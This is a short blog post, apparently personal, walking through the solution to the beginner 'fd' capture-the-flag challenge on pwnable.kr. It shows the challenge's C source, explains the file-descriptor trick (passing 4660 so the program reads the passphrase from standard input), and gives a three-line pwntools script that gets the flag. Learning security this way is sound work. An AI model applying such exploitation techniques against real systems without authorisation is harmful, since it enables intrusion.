+++
date = '2025-06-10T21:05:17+03:00'
title = 'Fd_ctf'
+++

this is how i solved the fd challenge on pwnable.kr

char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}

above is the code that we were given, we can notice that the theme is aboud linux file
descriptors , 0 for input , 1 for output, 2 for errors, the trick here is to convince
the file descriptor to be 0 so we can input the passkey LETMEWIN

inorder to acoomplish that, notice "fd = atoi(argv[1])-0x1234;
atoi(argv[1]) must be equal to 0x1234, atoi converts a string to a decimal,
so our inputs would be converted to a decimal number, 0x1234 is equal to 4660.
the input must be equal to 4660.

using pwntools i crafted the following payload:

from pwn import *

p = process(['./fd', '4660'])
p.send(b'LETMEWIN\n')
print(p.recvall().decode())

which then i receieved the flag.
